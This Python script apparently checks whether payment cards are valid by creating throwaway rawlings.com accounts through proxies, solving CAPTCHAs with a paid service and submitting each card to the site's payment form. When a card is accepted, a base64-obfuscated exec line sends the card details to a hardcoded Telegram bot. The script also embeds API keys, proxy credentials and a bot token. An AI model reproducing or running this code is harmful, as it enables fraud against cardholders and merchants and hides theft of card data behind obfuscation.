import requests , re , random , string , uuid , user_agent , logging , base64 , time
from requests_toolbelt.multipart.encoder import MultipartEncoder
from nextcaptcha import NextCaptchaAPI


logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger()
logger.setLevel(logging.WARNING)
def solve_captcha():
    CLIENT_KEY = "next_539374b047cf9ef78193d8747719c4f2e4"
    WEBSITE_URL = "https://www.rawlings.com/account/payments/add"
    WEBSITE_KEY = "6LcAbTsdAAAAALs6VC6e9mw2I4_I90kKNiEoo_PC"
    api = NextCaptchaAPI(client_key=CLIENT_KEY)
    result = api.recaptchav2(website_url=WEBSITE_URL, website_key=WEBSITE_KEY)
    if result.get('status') == 'ready' and 'solution' in result:
        return result['solution']['gRecaptchaResponse']
    else:
        return None
def Tele(ccx):
    ccx = ccx.strip().split('\n')[0]
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]
    time.sleep(7)

    username = "pchigogKJE-res-any"
    password = "PC_0Ap2T7KNFNbjNRWqL"
    proxy = "proxy.rapidseedbox.com:5959"
    proxies = {
                            "http": f"http://{username}:{password}@{proxy}",
                            "https": f"http://{username}:{password}@{proxy}"
                    }
    r = requests.Session()
    r.proxies.update(proxies)
    user = user_agent.generate_user_agent()
    def	 name():
        name = ''.join(random.choices(string.ascii_lowercase, k=6))	
        return f"{name}"	
    first = (name())
    last = (name())
    con = (name())
    def acc():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    acc = (acc())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.rawlings.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        # 'cookie': 'polaris_consent_settings={"clientId":"b7b5adfc-5213-4b1c-aabf-741a941af1dd","implicit":true,"analyticsPermitted":true,"personalizationPermitted":true,"adsPermitted":true,"notOptedOut":true,"essentialPermitted":true}; us_privacy=1YNN; _sfid_542d={%22anonymousId%22:%22deff991a16310ece%22%2C%22consents%22:[]}; _gcl_au=1.1.368716496.1738692000; tracker_device_is_opt_in=true; __cq_uuid=acXYcpQo3V7gSoU6PiagCNBwaa; cjConsent=MHxOfDB8Tnww; cjUser=51a2bcbc-0887-4cb4-b364-ed59ddcd0ee6; _fbp=fb.1.1738692000900.88187915856906836; tracker_device=8f79f3a6-7e4a-40dd-9e49-b07c5980826a; _lo_uid=234731-1738692009203-04231c35ec939d51; __lotl=https%3A%2F%2Fwww.rawlings.com%2Fon%2Fdemandware.store%2FSites-rawlings-consolidated-Site%2Fdefault%2FLogin-Show%3Frurl%3D1; _hjSessionUser_1186961=eyJpZCI6Ijk1YWU5OTVlLTRiN2UtNWRhZS1hMGUwLTM4YWIzZjExYTJjOSIsImNyZWF0ZWQiOjE3Mzg2OTIwMTk4NTUsImV4aXN0aW5nIjp0cnVlfQ==; _hjSessionUser_1324396=eyJpZCI6ImMxNTM3YmM3LTE1ZTYtNThiYy04MThhLTA3ZmM1MjgxZDRjMSIsImNyZWF0ZWQiOjE3Mzg2OTIwMDEwNjcsImV4aXN0aW5nIjp0cnVlfQ==; BVBRANDID=c6ae82e1-6a65-4ad7-909b-28af5e0d557e; __cq_bc=%7B%22bbbj-rawlings-consolidated%22%3A%5B%7B%22id%22%3A%22RSGRBOF2%22%7D%2C%7B%22id%22%3A%2222220244111%22%7D%5D%7D; __lotr=https%3A%2F%2Fwww.google.com%2F; _ga_RTT0STDWKP=GS1.2.1739366347.1.1.1739366362.45.0.0; _gcl_gs=2.1.k1$i1739366369$u42609446; _gcl_aw=GCL.1739366373.Cj0KCQjwiuC2BhDSARIsALOVfBLi_70VK2QhQ5PGdvWCJWpYdxw57jvEzknTG-JJ4bMbK_FwcJyODIUaAp_OEALw_wcB; _gac_UA-26480001-1=1.1739366373.Cj0KCQjwiuC2BhDSARIsALOVfBLi_70VK2QhQ5PGdvWCJWpYdxw57jvEzknTG-JJ4bMbK_FwcJyODIUaAp_OEALw_wcB; _gac_UA-26480001-21=1.1739366373.Cj0KCQjwiuC2BhDSARIsALOVfBLi_70VK2QhQ5PGdvWCJWpYdxw57jvEzknTG-JJ4bMbK_FwcJyODIUaAp_OEALw_wcB; _ga_KZ5GMG6JC1=GS1.2.1739388089.2.0.1739388089.60.0.0; _ga_DWDFYHTDXD=GS1.2.1739446365.1.1.1739446447.42.0.0; _evga_ad07={%22uuid%22:%22deff991a16310ece%22%2C%22puid%22:%22m0K2JIbMNORhdSKjQBCV_NXqHbImcY_cPx1SJluB8Y6oLAw4z1CS2ORXVw3HpT179rdciY2Jb0YgkiYmkQoIKhzvva1gCa0XzmZMxZb5NIk2ADitk_sA28NLfMKnB86S%22%2C%22affinityId%22:%220Ji%22}; __cq_dnt=0; dw_dnt=0; checkout_continuity_service=8f79f3a6-7e4a-40dd-9e49-b07c5980826a; _gid=GA1.2.984864444.1740745281; _hjSession_1324396=eyJpZCI6ImU3MTIzNzU1LTBkNjItNDdlNS05MTE0LTZmMjc2OTcxNjc3ZSIsImMiOjE3NDA3NDUyODE3NTMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _clck=6j5uc0%7C2%7Cftt%7C0%7C1861; bounceClientVisit6539v=N4IgNgDiBcIBYBcEQM4FIDMBBNAmAYnvgO6kB0ATgIbFgCWAdgOYpkDGA9gLZEcNEATAKZcqDAcSoUhZFAg7SiAZToIhKALTVajFhs4MUHegKpqBGlWsFCAZlQCuYBEQAyHJo0twOxTPgoHCjBMABEARhAAGhAKGBBokDoUAH0mDhSUdRQ6Phh7MCyY5LSITOzchnyqQqEAXyA; _lorid=234731-1740745283229-30359840b1c34ef3; _lo_v=19; _hjSession_1186961=eyJpZCI6IjY4NmJhOGRiLTg4YTUtNGYwNi1hN2U0LWE1NGNlMTY3ZDhmMiIsImMiOjE3NDA3NDUyOTU3MDcsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; sid=x4cyUmC4ony9KcHXmSDuiHYHYfdA1qM_LgA; dwsid=_kCE1dQW07m2k_Sk9yqMp0_A13D0eNL6JbomSwtyzmGzRkbmSF166BAS2himdH98VKQEeQQhcT2dHueIKAF6lg==; dwanonymous_b702b1e451de5ab0eae01b16c58475bb=acHonByhyvv8ilfbaqWLtmq0Ha; dwac_c93f0998353174a8ee104f07c8=x4cyUmC4ony9KcHXmSDuiHYHYfdA1qM_LgA%3D|dw-only|||USD|false|US%2FCentral|true; cqcid=acHonByhyvv8ilfbaqWLtmq0Ha; cquid=||; _gat_UA-26480001-1=1; _gat_UA-26480001-21=1; _ga_HWDFRN0FY4=GS1.1.1740745281.22.1.1740746223.51.0.0; _ga=GA1.2.4493722.1738692001; _uetsid=85306c80f5ce11efa835e3b9f8d805c0; _uetvid=da63cd90e32111ef9902951984523887; __cq_seg=0~-0.07!1~0.23!2~-0.67!3~0.07!4~0.23!5~-0.09!6~0.16!7~-0.03!8~0.56!9~-0.31!f0~3~1!n0~3; _clsk=2mlde7%7C1740746225630%7C7%7C1%7Cx.clarity.ms%2Fcollect',
    }

    response = r.get(
        'https://www.rawlings.com/on/demandware.store/Sites-rawlings-consolidated-Site/default/Login-Show',
        headers=headers,
    )
    csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.rawlings.com',
        'priority': 'u=1, i',
        'referer': 'https://www.rawlings.com/on/demandware.store/Sites-rawlings-consolidated-Site/default/Login-Show',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'x-queueit-ajaxpageurl': 'https%3A%2F%2Fwww.rawlings.com%2Fon%2Fdemandware.store%2FSites-rawlings-consolidated-Site%2Fdefault%2FLogin-Show',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'rurl': '1',
    }

    data = {
        'dwfrm_profile_customer_firstname': 'Christa',
        'dwfrm_profile_customer_lastname': 'afadf',
        'dwfrm_profile_customer_phone': '9195157620',
        'dwfrm_profile_customer_email': acc,
        'dwfrm_profile_customer_emailconfirm': acc,
        'dwfrm_profile_login_password': 'adaaasd0000adfeaqfa@gmail.com0A',
        'dwfrm_profile_login_passwordconfirm': 'adaaasd0000adfeaqfa@gmail.com0A',
        'optins[rawlings-consolidated]': 'on',
        'csrf_token': csrf_token,
    }

    response = r.post(
        'https://www.rawlings.com/on/demandware.store/Sites-rawlings-consolidated-Site/default/Account-SubmitRegistration',
        params=params,
        headers=headers,
        data=data,
    )
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://www.rawlings.com/account?registration=submitted',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }

    response = r.get('https://www.rawlings.com/account/payments/add', headers=headers)
    csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
    if n.startswith('4'):
        card_type = 'Visa'
    elif n.startswith('5'):
        card_type = 'MasterCard'
    g_token = solve_captcha()
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.rawlings.com',
        'priority': 'u=1, i',
        'referer': 'https://www.rawlings.com/account/payments/add',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'x-queueit-ajaxpageurl': 'https%3A%2F%2Fwww.rawlings.com%2Faccount%2Fpayments%2Fadd',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'dwfrm_creditCard_cardType': card_type,
        'paymentOption-Credit': '',
        'dwfrm_creditCard_cardOwner': 'ASdsd',
        'dwfrm_creditCard_cardNumber': n,
        'dwfrm_creditCard_expirationMonth': mm,
        'dwfrm_creditCard_expirationYear': f'20{yy}',
        #'dwfrm_creditCard_securityCode': '185',
        'dwfrm_creditCard_addressFields_firstName': 'Christa',
        'dwfrm_creditCard_addressFields_lastName': 'afadf',
        'dwfrm_creditCard_addressFields_address1': '1981 Jennifer Lane',
        'dwfrm_creditCard_addressFields_address2': '',
        'dwfrm_creditCard_addressFields_country': 'US',
        'dwfrm_creditCard_addressFields_states_stateCode': 'NY',
        'dwfrm_creditCard_addressFields_city': 'Raleigh',
        'dwfrm_creditCard_addressFields_postalCode': '10080',
        'dwfrm_creditCard_email': 'adfeaqfa@gmail.com',
        'csrf_token': csrf_token,
        'g-recaptcha-response': g_token,
    }

    response = r.post('https://www.rawlings.com/account/payments/save', headers=headers, data=data)

    mero = response.json()  
    if mero.get('success') == True:
        exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCgpib3RfdG9rZW4gPSAiNzYzMTI0MDAwMzpBQUdmQUdxWnBVYnlqUEpYY25jV3RseWdNa2hvU0RwMlRCWSIKY2hhdF9pZCA9ICI2NTIwMDQzMTU5IgptZXNzYWdlID0gZiJsaXZlIHtjY3h9IgoKdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZE1lc3NhZ2UiCmRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkLCAidGV4dCI6IG1lc3NhZ2V9CgpyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiMK"))
        return 'Card has been added successfully'
            
    return f"{mero.get('message', 'error')}"
#======================================================================================END================================================================================#
